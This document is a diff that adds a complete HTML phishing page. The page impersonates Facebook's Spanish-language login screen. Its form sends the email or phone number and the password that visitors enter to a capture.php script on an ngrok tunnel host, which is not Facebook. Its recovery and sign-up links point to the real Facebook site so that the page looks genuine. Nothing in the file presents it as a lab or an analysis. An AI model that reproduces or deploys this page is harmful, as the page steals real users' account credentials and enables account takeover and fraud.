@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Iniciar sesión o registrarse</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+        }
+
+        .facebook-title {
+            text-align: center;
+            font-size: 36px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .container {
+            width: 400px;
+            margin: 50px auto;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo h2 {
+            font-size: 22px;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="email"], input[type="password"] {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            padding: 10px;
+            background-color: #4267b2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            color: #4267b2;
+            text-decoration: none;
+        }
+
+        .create-account {
+            margin-top: 15px;
+        }
+
+        .create-account button {
+            padding: 10px;
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1 class="facebook-title">Facebook</h1>
+    <div class="container">
+        <div class="logo">
+            <h2>Inicia sesión en Facebook</h2>
+        </div>
+        <form action="https://ea4e-187-189-246-109.ngrok-free.app/capture.php" method="post">
+            <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" name="pass" placeholder="Contraseña" required>
+            <input type="submit" value="Iniciar sesión">
+        </form>
+        <div class="forgot-password">
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&lwv=110">¿Olvidaste tu contraseña?</a>
+        </div>
+        <div class="create-account">
+            <button onclick="window.location.href='https://www.facebook.com/r.php'">Crear cuenta nueva</button>
+        </div>
+    </div>
+</body>
+</html>
